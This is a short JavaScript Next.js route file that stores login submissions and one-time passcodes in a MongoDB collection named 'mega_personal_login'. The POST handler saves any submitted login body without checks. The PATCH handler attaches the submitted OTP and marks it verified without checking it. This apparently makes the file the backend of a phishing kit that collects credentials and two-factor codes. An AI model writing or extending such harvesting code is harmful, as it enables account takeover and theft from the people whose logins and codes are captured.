import { MongoClient, ObjectId } from 'mongodb';
require('dotenv').config();

const uri = process.env.MONGODB_URI;
const client = new MongoClient(uri);

async function connectToDatabase() {
  if (!client.topology || !client.topology.isConnected()) {
    await client.connect();
  }
  return client.db('cloud'); // Replace with your database name
}

// POST method for initial login
export async function POST(req) {
  try {
    const body = await req.json(); // Parse the incoming request body

    const db = await connectToDatabase();
    const collection = db.collection('mega_personal_login'); // Replace with your collection name

    const result = await collection.insertOne(body);

    return new Response(
      JSON.stringify({
        success: true,
        message: 'Object successfully posted to the database.',
        data: result,
      }),
      { status: 201 }
    );
  } catch (error) {
    console.error('Error posting object:', error.message);
    return new Response(
      JSON.stringify({
        success: false,
        message: 'Failed to post the object to the database.',
      }),
      { status: 500 }
    );
  }
}

// PATCH method for OTP verification
export async function PATCH(req) {
  try {
    const body = await req.json();
    const { id, otp } = body;

    if (!id || !otp) {
      return new Response(
        JSON.stringify({
          success: false,
          message: 'ID and OTP are required.',
        }),
        { status: 400 }
      );
    }

    const db = await connectToDatabase();
    const collection = db.collection('mega_personal_login');

    // Update the document with the provided ID by adding the OTP field
    const result = await collection.updateOne(
      { _id: new ObjectId(id) },
      {
        $set: {
          otp: otp,
          otpVerifiedAt: new Date()
        }
      }
    );

    if (result.matchedCount === 0) {
      return new Response(
        JSON.stringify({
          success: false,
          message: 'No record found with the provided ID.',
        }),
        { status: 404 }
      );
    }

    if (result.modifiedCount === 0) {
      return new Response(
        JSON.stringify({
          success: false,
          message: 'Failed to update the record.',
        }),
        { status: 400 }
      );
    }

    return new Response(
      JSON.stringify({
        success: true,
        message: 'OTP successfully added to the record.',
        data: {
          matchedCount: result.matchedCount,
          modifiedCount: result.modifiedCount
        },
      }),
      { status: 200 }
    );
  } catch (error) {
    console.error('Error updating object:', error.message);
    return new Response(
      JSON.stringify({
        success: false,
        message: 'Failed to update the object in the database.',
        error: error.message,
      }),
      { status: 500 }
    );
  }
}